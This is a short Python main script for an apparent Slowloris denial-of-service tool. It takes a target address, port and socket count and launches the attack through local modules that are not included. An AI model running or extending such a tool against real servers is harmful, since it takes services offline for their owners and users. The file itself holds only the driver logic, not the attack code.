from target import Target
import user_agent as ua
import parserArg as parser
import connection as con
import socket
import logging
import random
import time
import sys

def main():
    arg = parser.parsArg()
    target_info = Target(arg.addr,arg.port,arg.sockets)
    connection = con.Connection(target_info)
    connection.retrieve_ws()
    list_of_sockets = []

    connection.start_attack()

  

if __name__ == "__main__":
    logging.basicConfig(stream=sys.stdout,format='%(asctime)s - %(message)s', datefmt='%H:%M:%S', level=logging.INFO)
    logging.info('Slow Loris Attack Started')
    main()